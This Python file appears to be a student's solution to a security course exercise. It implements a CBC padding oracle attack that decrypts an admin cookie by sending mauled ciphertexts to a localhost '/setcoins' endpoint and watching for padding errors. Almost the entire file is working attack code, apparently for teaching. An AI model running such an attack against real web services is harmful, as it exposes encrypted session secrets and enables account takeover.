import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms
from requests import codes, Session
from maul import do_login_form
import base64
import binascii

SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = algorithms.AES.block_size/8

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        sess=Session()
        uname ="victim"
        pw = "victim"
        assert(do_login_form(sess, uname,pw))
        # set Mauled cookie to admin cookie
        cookies = sess.cookies
        cookies.set(
            "admin",
            ct.hex(),
            domain=cookies.list_domains()[0],
            path=cookies.list_paths()[0]
	    )

        data_dict = {"username":uname,\
                "amount":str(5000),\
                }
        response = sess.post(SETCOINS_FORM_URL,data_dict)

        return b'Bad padding for admin cookie!' not in response.content

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    # slice indices must be integers
    block_length = int(po.block_length)
    c0, c1 = list(split_into_blocks(ctx, block_length))

    decoded = [0] * block_length
    # a list to store intermediate values 
    # for each byte in the block
    temp = [0] * block_length
    msg = ''
    for i in reversed(range(block_length)):
        # locate the current padded byte
        cur_pad_byte = (block_length-i)
        for cur_byte in range(0,256):
            prefix = c0[:i]
            suffix = []
            for val in temp[i+1:]:
                suffix.append(cur_pad_byte ^ val)
            # [cur_pad_byte ^ val for val in temp[i+1:]]
            byte_array = bytearray(prefix)
            byte_array.append(cur_byte)
            byte_array.extend(suffix)
            
            # convert the mauled c0 back to bytes 
            # and test if the modification returns an error
            if po.test_ciphertext((bytes(byte_array) + c1)):
                temp[i] = cur_byte ^ cur_pad_byte
                cur_decoded_ascii = cur_byte ^ c0[i] ^ cur_pad_byte
                decoded[i] = cur_decoded_ascii
                cur_decoded_char = chr(cur_decoded_ascii)
                msg += cur_decoded_char
        print(f"Cracking the {i} block")
    msg = msg[::-1]
    print(msg)
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    # slice indices must be integers
    ctx_blocks = list(split_into_blocks(ctx, int(po.block_length)))
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.
    
    messages = ""
    print(f"total number of blocks = {nblocks}")
    for i in range(nblocks - 1):
        c0 = ctx_blocks[i]
        c1 = ctx_blocks[i + 1]

        print(f"Cracking the message {i}.")

        cur_msg = po_attack_2blocks(po, c0 + c1)
        messages += cur_msg
        print("cur_msg: ", cur_msg)
    print("recovered message:", messages)
    return messages

cookie='e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d'
po = PaddingOracle(SETCOINS_FORM_URL)
cookie_bytes = bytearray.fromhex(cookie)
po_attack(po, cookie_bytes)
